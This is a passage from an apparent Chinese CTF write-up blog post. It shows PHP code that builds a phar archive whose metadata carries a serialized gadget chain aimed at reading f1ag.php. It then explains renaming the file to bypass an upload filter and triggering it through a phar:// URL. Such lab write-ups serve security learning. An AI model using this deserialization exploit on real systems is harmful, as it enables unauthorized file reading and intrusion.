</span></span><span style="display:flex;"><span>$show <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Show</span>();
</span></span><span style="display:flex;"><span>$test <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Test</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$test<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parms</span>[<span style="color:#e6db74">&#39;source&#39;</span>]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/www/html/f1ag.php&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 为什么设置&#39;source&#39;? 因为: $this-&gt;str[&#39;str&#39;]-&gt;source;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$c<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> $show;
</span></span><span style="display:flex;"><span>$show<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span>[<span style="color:#e6db74">&#39;str&#39;</span>]<span style="color:#f92672">=</span>$test;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#34;mm.phar&#34;</span>);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">startBuffering</span>();
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setStub</span>(<span style="color:#e6db74">&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;</span>);
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setMetadata</span>($c);     
</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#34;test.txt&#34;</span>, <span style="color:#e6db74">&#34;test&#34;</span>); <span style="color:#75715e">// 生成签名
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stopBuffering</span>();
</span></span></code></pre></div><p><code>function.php</code>限制上传的文件后缀，但是到最后都会被命名为<code>xxxxxx.jpg</code>文件。<code>mm.phar</code>改成png结尾，</p>
<p>上传文件，然后利用phar伪协议<code>http://xxxxx/file.php?file=phar://upload/xxxx.jpg</code></p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
